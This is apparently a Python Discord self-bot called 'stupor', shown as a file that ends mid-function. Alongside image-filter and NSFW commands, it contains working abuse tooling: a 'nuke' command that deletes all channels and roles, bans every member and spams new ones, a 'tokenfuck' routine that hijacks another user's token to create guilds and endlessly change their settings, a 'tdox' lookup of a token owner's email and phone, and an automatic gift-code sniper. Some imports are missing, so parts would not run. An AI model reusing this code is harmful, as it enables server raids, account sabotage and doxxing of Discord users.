import os, discord, random, requests, datetime, psutil, platform, io, asyncio, time, colorama, json, re, numpy
from colorama import Fore, Style
from discord.ext import commands, tasks
from os import system
from requests import get, post
from discord import Permissions

languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

locales = [
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

m_numbers = [
    ":one:",
    ":two:",
    ":three:",
    ":four:",
    ":five:",
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]


ily = '''
                                                  ▓▓▓▓                              
                          ▓▓▓▓                  ▓▓    ▓▓                            
                        ▓▓    ▓▓                ▓▓      ▓▓                          
                      ▓▓      ▓▓          ▓▓▓▓    ▓▓    ▓▓                          
                      ▓▓    ░░          ▓▓    ░░        ▓▓                          
                ▓▓    ▓▓          ▓▓▓▓    ▓▓  ▓▓        ▓▓                          
              ▓▓      ▓▓        ▓▓    ▓▓      ▓▓      ▓▓                            
              ▓▓        ▓▓      ▓▓  ▓▓        ▓▓      ▓▓        ▓▓                  
            ░░          ▓▓      ▓▓            ▓▓    ░░                              
            ▓▓            ▓▓    ▓▓          ▓▓    ▓▓              ▓▓                
            ▓▓              ░░  ▓▓          ▓▓    ▓▓              ▓▓                
            ▓▓              ▓▓    ▓▓      ▓▓    ▓▓                ▓▓                
            ▓▓                ▓▓  ▓▓      ▓▓  ▓▓                  ▓▓                
            ▓▓▓▓                ▓▓  ▓▓    ▓▓▓▓                  ▓▓▓▓                
            ▓▓▓▓                  ▓▓▓▓  ▓▓▓▓                    ▓▓▓▓                
              ▓▓▓▓                    ▓▓▓▓                    ▓▓▓▓▓▓                
▓▓            ▓▓▒▒▓▓                ▒▒▒▒▒▒▒▒                ▓▓▒▒▓▓            ▓▓    
▓▓            ▓▓▒▒▒▒▓▓▓▓        ▒▒▒▒      ░░▒▒▒▒        ▓▓▓▓▒▒▓▓▓▓            ▓▓    
  ▓▓            ▓▓▒▒▒▒▒▒▓▓    ▒▒          ░░░░░░▒▒  ▓▓▓▓▒▒▒▒▓▓▓▓            ▓▓      
  ▓▓            ▓▓▒▒▒▒▒▒▒▒▓▓  ▒▒    ░░░░░░░░░░░░░░▓▓▒▒▒▒▒▒▓▓▓▓▓▓            ▓▓      
    ▓▓            ▓▓▒▒▒▒▒▒▒▒▓▓░░░░░░░░░░░░░░░░  ▓▓▒▒▒▒▒▒▓▓▓▓▓▓            ▓▓        
    ▓▓▓▓            ▓▓▒▒▒▒▒▒▒▒▓▓░░░░░░░░░░░░  ▓▓▒▒▒▒▒▒▒▒▓▓▓▓            ▓▓▓▓        
    ▓▓▒▒░░          ▓▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓░░░░░░  ▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓          ▒▒▓▓▓▓        
      ▓▓▒▒▓▓          ▓▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓      ▓▓▒▒▒▒▒▒▓▓▓▓▓▓          ▓▓▒▒▓▓          
      ▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓  ▓▓▓▓▒▒▒▒▓▓▓▓▓▓    ▓▓▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓          
        ▓▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ▓▓▒▒▒▒▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓            
          ▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓              
            ▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓                
                ▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓                    
                  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓                      
                    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                        
                          ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                              
                                  ▓▓▓▓▓▓▓▓▓▓▓▓                                      
                            ██████▓▓▓▓▓▓▓▓▓▓▓▓████████████                          
                      ▓▓▓▓▓▓        ▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓                      
                    ██      ░░░░░░░░░░▒▒▓▓░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓██                    
                  ██    ░░░░░░▒▒▒▒▒▒▒▒▓▓▓▓░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▓▓▓▓                  
                ▓▓  ░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓  ░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▓▓▓▓                
                ▓▓  ░░░░▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓  ██  ░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▓▓                
              ▓▓  ░░░░▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓  ▓▓  ░░░░░░░░░░░░▒▒▒▒▒▒▒▒▓▓▓▓              
              ▓▓  ░░▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓    ▓▓    ░░░░░░░░░░░░▒▒▒▒▒▒▓▓▓▓              
              ▓▓░░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓        ▓▓    ░░░░░░░░░░░░▒▒▒▒▒▒▓▓              
            ██░░░░▒▒▒▒▓▓▓▓▓▓▓▓              ▓▓      ░░░░░░░░░░░░▒▒▒▒▓▓██    ░░░░  ░░
            ▓▓░░▒▒▒▒▓▓▓▓▓▓                    ██        ░░░░░░░░░░▒▒▒▒▓▓            
            ▓▓░░▒▒▓▓▓▓                          ▓▓▓▓        ░░░░░░░░▒▒▓▓    ▒▒▓▓▒▒▒▒
            ▓▓▒▒▒▒▓▓                                ▓▓▓▓▓▓▓▓        ░░▓▓      ▒▒░░  
            ▓▓▒▒▓▓                                          ████████▓▓▓▓    ░░  ░░▒▒
            ██▓▓                                                                    

'''

snipe_message_author = {}
snipe_message_content = {}
start_time = datetime.datetime.utcnow()

with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
password = config.get('password')
prefix = config.get('prefix')
embedmode = config.get('embed')
nitro_sniper = config.get('nitro_sniper')
logstat = config.get('logger')

if nitro_sniper == True:
    nitro = f"{Fore.GREEN}♦TRUE"
else:
    nitro = f"{Fore.RED}♦FALSE"

if embedmode == True:
    embedm = f"{Fore.GREEN}♦TRUE"
else:
    embedm = f"{Fore.RED}♦FALSE"

if logstat == "":
    logst = f"{Fore.RED}♦FALSE"
else:
    logst = f"{Fore.GREEN}♦TRUE"

if token == "":
    os.system(clear)
    print(f"{Fore.RED} Please enter token in {Fore.WHITE}config.json{Fore.RESET}")
else:
    pass

class bot(object):

    global stupor
    stupor = commands.Bot(command_prefix=prefix, self_bot=True)
    stupor.remove_command("help")
    if stupor.loop.is_running:
        os.system("clear")
        print(f'''
{Fore.WHITE}{Style.DIM} ██▓███  ▓█{Style.RESET_ALL}{Fore.LIGHTGREEN_EX}█{Fore.WHITE}{Style.DIM}███  ██▀███   ██▓▓██{Style.RESET_ALL}{Fore.GREEN}█{Fore.WHITE}{Style.DIM}██▄  ▒█████  ▄▄▄█████▓
▓██░  ██▒▓█   ▀ ▓█{Style.RESET_ALL}{Fore.GREEN}█{Fore.WHITE}{Style.DIM} ▒ ██▒▓██▒▒██▀ ██▌▒██{Style.RESET_ALL}{Fore.LIGHTGREEN_EX}▒{Fore.WHITE}{Style.DIM}  ██▒▓  ██▒ ▓▒
▓█{Style.RESET_ALL}{Fore.LIGHTGREEN_EX}█{Fore.WHITE}{Style.DIM}░ ██▓▒▒███   ▓██ ░▄█ ▒▒██▒░██   █▌▒██░  ██▒▒ ▓██░ ▒░
▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█{Style.RESET_ALL}{Fore.LIGHTGREEN_EX}▄{Fore.WHITE}{Style.DIM}  ░██░░▓█▄   ▌▒██   ██░░ ▓██▓ ░ 
▒██▒ ░  ░░▒{Style.RESET_ALL}{Fore.GREEN}█{Fore.WHITE}{Style.DIM}███▒░██▓ ▒██▒░██░░▒████▓ ░ ████▓▒░  ▒█{Style.RESET_ALL}{Fore.GREEN}█{Fore.WHITE}{Style.DIM}▒ ░ 
▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░░{Style.RESET_ALL}{Fore.LIGHTGREEN_EX}▓{Fore.WHITE}{Style.DIM}   ▒▒▓  ▒ ░ ▒░▒░▒░   ▒ ░░   
░▒ ░      ░ ░  ░  ░▒ ░ ▒░ ▒ ░ ░ ▒  ▒   ░ ▒ ▒░     ░    
░{Style.RESET_ALL}{Fore.LIGHTGREEN_EX}░{Fore.WHITE}{Style.DIM}          ░     ░░   ░  ▒ ░ ░ ░  ░ ░ ░ ░ ▒    ░      
            ░  {Style.RESET_ALL}{Fore.GREEN}░{Fore.WHITE}{Style.DIM}   ░      ░     {Style.RESET_ALL}{Fore.GREEN}░{Fore.WHITE}{Style.DIM}        ░ {Style.RESET_ALL}{Fore.LIGHTGREEN_EX}░{Fore.WHITE}{Style.DIM}           
                              ░                     

    {Style.RESET_ALL}{Fore.WHITE}EMBEDDED:    | {embedm}
    {Fore.WHITE}NITRO SNIPE: | {nitro}
    {Fore.WHITE}LOGGING:     | {logst}{Fore.RESET}
    ''')

    @stupor.event
    async def on_command_error(ctx, error):
        error_str = str(error)
        error = getattr(error, 'original', error)
        if isinstance(error, commands.CommandNotFound):
            return
        elif isinstance(error, commands.CheckFailure):
            await ctx.send('[ERROR]: You\'re missing permission to execute this command', delete_after=3)
        elif isinstance(error, commands.MissingRequiredArgument):
            await ctx.send(f"[ERROR]: Missing arguments: {error}", delete_after=3)
        elif isinstance(error, numpy.AxisError):
            await ctx.send('Invalid Image', delete_after=3)
        elif isinstance(error, discord.errors.Forbidden):
            await ctx.send(f"[ERROR]: 404 Forbidden Access: {error}", delete_after=3)
        elif "Cannot send an empty message" in error_str:
            await ctx.send('[ERROR]: Message contents cannot be null', delete_after=3)
        else:
            await ctx.send(f'[ERROR]: {error_str}', delete_after=3)

    @stupor.event
    async def on_message_edit(before, after):
        await stupor.process_commands(after)

    @stupor.event
    async def on_message(message):

        def logger(message):
            e = int(config.get('logger'))
            if e == None:
                pass
            else:
                r = message.author.id
                if r == e:
                    with open("log.txt", "a") as text_file:
                        print(f"\nmessage: {message.content}\n-------------\n", file=text_file)
                else:
                    return

        def NitroData(elapsed, code):
            print(
            f"{Fore.WHITE}CHANNEL: {Fore.GREEN}|{message.channel}|" 
            f"\n{Fore.WHITE}SERVER: {Fore.GREEN}|{message.guild}|"
            f"\n{Fore.WHITE}AUTHOR: {Fore.GREEN}|{message.author}|"
            f"\n{Fore.WHITE}ELAPSED: {Fore.GREEN}|{elapsed}|"
            f"\n{Fore.WHITE}CODE: {Fore.GREEN}|{code}|"
        +Fore.RESET)      

        time = datetime.datetime.now().strftime("%H:%M %p")  
        if 'discord.gift/' in message.content:
            if nitro_sniper == True:
                start = datetime.datetime.now()
                code = re.search("discord.gift/(.*)", message.content).group(1)
                token = config.get('token')
                
                headers = {'Authorization': token}
    
                r = requests.post(
                    f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem', 
                    headers=headers,
                ).text
        
                elapsed = datetime.datetime.now() - start
                elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

                if 'This gift has been redeemed already.' in r:
                    print(""
                    f"\n{Fore.RED}{time}  |NITRO INVALID|"+Fore.RESET)
                    NitroData(elapsed, code)

                elif 'subscription_plan' in r:
                    print(""
                    f"\n{Fore.WHITE}{time}  |NITRO SUCCESS|"+Fore.RESET)
                    NitroData(elapsed, code)

                elif 'Unknown Gift Code' in r:
                    print(""
                    f"\n{Fore.RED}{time}  |NITRO INVALID|"+Fore.RESET)
                    NitroData(elapsed, code)
            else:
                return
        await stupor.process_commands(message)


    @stupor.event
    async def on_message_delete(message):
        snipe_message_author[message.channel.id] = message.author
        snipe_message_content[message.channel.id] = message.content

    @stupor.command()
    async def help(ctx):
        await ctx.message.delete()
        embed = discord.Embed(color=0x000000)
        embed.add_field(name="All commands", value=f'''
{prefix}fun
{prefix}utility
{prefix}raid
{prefix}nsfw''')
        if embedmode is True:
            await ctx.send(embed=embed)
        else:
            await ctx.send(f'''```
All commands
{prefix}fun
{prefix}utility
{prefix}raid
{prefix}nsfw```''')

    @stupor.command()
    async def nsfw(ctx):
        await ctx.message.delete()
        embed = discord.Embed(color=0x000000)
        embed.add_field(name="NSFW commands", value=f'''
{prefix}feet
{prefix}hentai
{prefix}neko
{prefix}wallpaper
{prefix}boobs
{prefix}tits
{prefix}nsfwpfp
{prefix}blowjob
{prefix}lewdneko
{prefix}lesbian''')
        if embedmode is True:
            await ctx.send(embed=embed)
        else:
            await ctx.send(f'''```
NSFW commands
{prefix}feet
{prefix}hentai
{prefix}neko
{prefix}wallpaper
{prefix}boobs
{prefix}tits
{prefix}nsfwpfp
{prefix}blowjob
{prefix}lewdneko
{prefix}lesbian```''')

    @stupor.command()
    async def fun(ctx):
        await ctx.message.delete()
        embed = discord.Embed(color=0x000000)
        embed.add_field(name="Fun commands", value=f'''
{prefix}minesweeper
{prefix}magik
{prefix}fry
{prefix}blur
{prefix}pixelate
{prefix}supreme
{prefix}darksupreme
{prefix}invert
{prefix}gay
{prefix}blurpify
{prefix}fax
{prefix}communist
{prefix}jpegify
{prefix}pornhub
{prefix}pornhubcomment
{prefix}tweet
{prefix}slap
{prefix}tickle
{prefix}feed
{prefix}hug
{prefix}snipe''')
        if embedmode is True:
            await ctx.send(embed=embed)
        else:
            await ctx.send(f'''```
Fun commands
{prefix}minesweeper
{prefix}magik
{prefix}fry
{prefix}blur
{prefix}pixelate
{prefix}supreme
{prefix}darksupreme
{prefix}invert
{prefix}gay
{prefix}blurpify
{prefix}fax
{prefix}communist
{prefix}jpegify
{prefix}pornhub
{prefix}pornhubcomment
{prefix}tweet
{prefix}slap
{prefix}tickle
{prefix}feed
{prefix}hug
{prefix}snipe```''')

    @stupor.command()
    async def raid(ctx):
        await ctx.message.delete()
        embed = discord.Embed(color=0x000000)
        embed.add_field(name="Raid commands", value=f'''
{prefix}massban
{prefix}massunban
{prefix}masskick
{prefix}massrole
{prefix}masschannel
{prefix}delchannels
{prefix}delroles''')
        if embedmode is True:
            await ctx.send(embed=embed)
        else:
            await ctx.send(f'''```
Raid commands
{prefix}massban
{prefix}massunban
{prefix}masskick
{prefix}massrole
{prefix}masschannel
{prefix}delchannels
{prefix}delroles```''')

    @stupor.command()
    async def utility(ctx):
        await ctx.message.delete()
        embed = discord.Embed(color=0x000000)
        embed.add_field(name="Util commands", value=f'''
{prefix}geoip
{prefix}playing
{prefix}stoplaying
{prefix}read
{prefix}tdox
{prefix}encode
{prefix}decode
{prefix}av
{prefix}tokenfuck
{prefix}purge
{prefix}spam
{prefix}whois
{prefix}info
{prefix}root''')
        if embedmode is True:
            await ctx.send(embed=embed)
        else:
            await ctx.send(f'''```
Util commands
{prefix}geoip
{prefix}playing
{prefix}stoplaying
{prefix}read
{prefix}tdox
{prefix}encode
{prefix}decode
{prefix}av
{prefix}tokenfuck
{prefix}purge
{prefix}spam
{prefix}whois
{prefix}info
{prefix}root```''')

    @stupor.command(aliases=["game"])
    async def playing(ctx, *, message):
        await ctx.message.delete()
        game = discord.Game(
            name=message
        )
        await stupor.change_presence(activity=game)

    @stupor.command(aliases=["stopplaying"])
    async def stopactivity(ctx):
        await ctx.message.delete()
        await stupor.change_presence(activity=None, status=discord.Status.dnd)

    @stupor.command(aliases=["iplookup"])
    async def geoip(ctx, arg1):
        await ctx.message.delete()
        gay = requests.get("http://ip-api.com/json/%s?fields=65535" % arg1)
        ipjson = gay.json()
        city = ipjson["city"]
        country = ipjson["country"]
        isp = ipjson["isp"]
        org = ipjson["org"]
        host = ipjson["as"]
        embed = discord.Embed(colour=0x000000)
        embed.add_field(name=f'Results for {arg1}', value=f'''
**ISP:** {isp}
**ISP2:** {org}
**Host:** {host}
**Country:** {country}
**City:** {city}
    ''', inline=False)
        if embedmode is True:
            await ctx.send(embed=embed)
        else:
            await ctx.send(f'''```
Results for: {arg1}
ISP: {isp}
ISP2: {org}
Host: {host}
Country: {country}
City: {city}```''')

    @stupor.command()
    async def encode(ctx, string):
        await ctx.message.delete()
        decoded_stuff = base64.b64encode('{}'.format(string).encode('ascii'))
        encoded_stuff = str(decoded_stuff)
        encoded_stuff = encoded_stuff[2:len(encoded_stuff)-1]
        await ctx.send(encoded_stuff)

    @stupor.command()
    async def decode(ctx, string):
        await ctx.message.delete()
        strOne = (string).encode("ascii")
        pad = len(strOne)%4
        strOne += b"="*pad
        encoded_stuff = codecs.decode(strOne.strip(),'base64')
        decoded_stuff = str(encoded_stuff)
        decoded_stuff = decoded_stuff[2:len(decoded_stuff)-1]
        await ctx.send(decoded_stuff)

    @stupor.command()
    async def nuke(ctx): 
        await ctx.message.delete()
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
            except:
                pass
        for user in list(ctx.guild.members):
            try:
                await user.ban()
            except:
                pass
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
            except:
                pass
        try:
            await ctx.guild.edit(
                name=RandString(),
                description="fuck you",
                reason="fuck you",
                icon=None,
                banner=None
            )
        except:
            pass
        for _i in range(250):
            await ctx.guild.create_text_channel(name=RandString())
        for _i in range(250):
            await ctx.guild.create_role(name=RandString(), color=RandomColor())

    @stupor.command(aliases=['markasread', 'ack'])
    async def read(ctx):
        await ctx.message.delete()
        for guild in stupor.guilds:
            await guild.ack()

    @stupor.command(aliases=["deepfry"])
    async def fry(ctx, user: discord.Member = None):
        await ctx.message.delete()
        endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
        if user is None:
            avatar = str(ctx.author.avatar_url_as(format="png"))
            endpoint += avatar
            r = requests.get(endpoint)
            res = r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(str(res['message'])) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"stupor_fry.png"))
            except:
                await ctx.send(res['message'])
        else:
            avatar = str(user.avatar_url_as(format="png"))
            endpoint += avatar
            r = requests.get(endpoint)
            res = r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(str(res['message'])) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"stupor_fry.png"))
            except:
                await ctx.send(res['message'])


    @stupor.command()
    async def blur(ctx, user: discord.Member = None):
        await ctx.message.delete()
        endpoint = "https://api.alexflipnote.dev/filter/blur?image="
        if user is None:
            avatar = str(ctx.author.avatar_url_as(format="png"))
            endpoint += avatar
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(endpoint) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"stupor_blur.png"))
            except:
                await ctx.send(endpoint)
        else:
            avatar = str(user.avatar_url_as(format="png"))
            endpoint += avatar
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(endpoint) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"stupor_blur.png"))
            except:
                await ctx.send(endpoint)


    @stupor.command(aliases=["pixel"])
    async def pixelate(ctx, user: discord.Member = None):
        await ctx.message.delete()
        endpoint = "https://api.alexflipnote.dev/filter/pixelate?image="
        if user is None:
            avatar = str(ctx.author.avatar_url_as(format="png"))
            endpoint += avatar
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(endpoint) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"stupor_blur.png"))
            except:
                await ctx.send(endpoint)
        else:
            avatar = str(user.avatar_url_as(format="png"))
            endpoint += avatar
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(endpoint) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"stupor_blur.png"))
            except:
                await ctx.send(endpoint)


    @stupor.command()
    async def supreme(ctx, *, args=None):
        await ctx.message.delete()
        if args is None:
            await ctx.send("missing parameters")
            return
        endpoint = "https://api.alexflipnote.dev/supreme?text=" + args.replace(" ", "%20")
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"stupor_supreme.png"))
        except:
            await ctx.send(endpoint)

 
    @stupor.command()
    async def darksupreme(ctx, *, args=None):
        await ctx.message.delete()
        if args is None:
            await ctx.send("missing parameters")
            return
        endpoint = "https://api.alexflipnote.dev/supreme?text=" + args.replace(" ", "%20") + "&dark=true"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"stupor_dark_supreme.png"))
        except:
            await ctx.send(endpoint)


    @stupor.command(aliases=["facts"])
    async def fax(ctx, *, args=None):
        await ctx.message.delete()
        if args is None:
            await ctx.send("missing parameters")
            return
        endpoint = "https://api.alexflipnote.dev/facts?text=" + args.replace(" ", "%20")
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"stupor_facts.png"))
        except:
            await ctx.send(endpoint)


    @stupor.command(aliases=["blurp"])
    async def blurpify(ctx, user: discord.Member = None):
        await ctx.message.delete()
        endpoint = "https://nekobot.xyz/api/imagegen?type=blurpify&image="
        if user is None:
            avatar = str(ctx.author.avatar_url_as(format="png"))
            endpoint += avatar
            r = requests.get(endpoint)
            res = r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(str(res['message'])) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"stupor_blurpify.png"))
            except:
                await ctx.send(res['message'])
        else:
            avatar = str(user.avatar_url_as(format="png"))
            endpoint += avatar
            r = requests.get(endpoint)
            res = r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(str(res['message'])) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"stupor_blurpify.png"))
            except:
                await ctx.send(res['message'])

    @stupor.command(aliases=['tokenfucker', 'disable', 'crash'])
    async def tokenfuck(ctx, _token):
        await ctx.message.delete()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
            'Content-Type': 'application/json',
            'Authorization': _token,
        }
        request = requests.Session()
        payload = {
            'theme': "light",
            'locale': "ja",
            'message_display_compact': False,
            'inline_embed_media': False,
            'inline_attachment_media': False,
            'gif_auto_play': False,
            'render_embeds': False,
            'render_reactions': False,
            'animate_emoji': False,
            'convert_emoticons': False,
            'enable_tts_command': False,
            'explicit_content_filter': '0',
            'status': "invisible"
        }
        guild = {
            'channels': None,
            'icon': None,
            'name': "Exeter",
            'region': "europe"
        }
        for _i in range(50):
            requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break
        modes = cycle(["light", "dark"])
        statuses = cycle(["online", "idle", "dnd", "invisible"])
        while True:
            setting = {
                'theme': next(modes),
                'locale': random.choice(locales),
                'status': next(statuses)
            }
            while True:
                try:
                    request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=setting,
                                timeout=10)
                except Exception as e:
                    print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
                else:
                    break

    @stupor.command(aliases=['tokinfo', 'tdox'])
    async def tokeninfo(ctx, _token):
        await ctx.message.delete()
        headers = {
            'Authorization': _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                '%d-%m-%Y %H:%M:%S UTC')
        except KeyError:
            headers = {
                'Authorization': "Bot " + _token,
                'Content-Type': 'application/json'
            }
            try:
                res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
                res = res.json()
                user_id = res['id']
                locale = res['locale']
                avatar_id = res['avatar']
                language = languages.get(locale)
                creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                    '%d-%m-%Y %H:%M:%S UTC')
                em = discord.Embed(
                    description=f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
                fields = [
                    {'name': 'Flags', 'value': res['flags']},
                    {'name': 'Local language', 'value': res['locale'] + f"{language}"},
                    {'name': 'Verified', 'value': res['verified']},
                ]
                for field in fields:
                    if field['value']:
                        em.add_field(name=field['name'], value=field['value'], inline=False)
                return await ctx.send(embed=em)
            except KeyError:
                await ctx.send("Invalid token")
        em = discord.Embed(
            description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
        # em.set_footer(text=_token)
        nitro_type = "None"
        if "premium_type" in res:
            if res['premium_type'] == 2:
                nitro_type = "Nitro Premium"
            elif res['premium_type'] == 1:
                nitro_type = "Nitro Classic"
        fields = [
            {'name': 'Phone', 'value': res['phone']},
            {'name': 'Flags', 'value': res['flags']},
            {'name': 'Local language', 'value': res['locale'] + f"{language}"},
            {'name': 'MFA', 'value': res['mfa_enabled']},
            {'name': 'Verified', 'value': res['verified']},
            {'name': 'Nitro', 'value': nitro_type},
        ]
        for field in fields:
            if field['value']:
                em.add_field(name=field['name'], value=field['value'], inline=False)
        return await ctx.send(embed=em)

    @stupor.command(aliases=['pfp', 'avatar'])
    async def av(ctx, *, user: discord.Member = None):
        await ctx.message.delete()
        format = "gif"
        user = user or ctx.author
        if user.is_avatar_animated() != True:
            format = "png"
        avatar = user.avatar_url_as(format=format if format != "gif" else None)
        async with aiohttp.ClientSession() as session:
            async with session.get(str(avatar)) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Avatar.{format}"))

    @stupor.command()
    async def invert(ctx, user: discord.Member = None):
        await ctx.message.delete()
        endpoint = "https://api.alexflipnote.dev/filter/invert?image="
        if user is None:
            avatar = str(ctx.author.avatar_url_as(format="png"))
            endpoint += avatar
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(endpoint) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"stupor_invert.png"))
            except:
                await ctx.send(endpoint)
        else:
            avatar = str(user.avatar_url_as(format="png"))
            endpoint += avatar
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(endpoint) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"stupor_invert.png"))
            except:
                await ctx.send(endpoint)


    @stupor.command()
    async def gay(ctx, user: discord.Member = None):
        await ctx.message.delete()
        endpoint = "https://api.alexflipnote.dev/filter/gay?image="
        if user is None:
            avatar = str(ctx.author.avatar_url_as(format="png"))
            endpoint += avatar
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(endpoint) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"stupor_invert.png"))
            except:
                await ctx.send(endpoint)
        else:
            avatar = str(user.avatar_url_as(format="png"))
            endpoint += avatar
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(endpoint) as resp:
                        image = await resp.read()
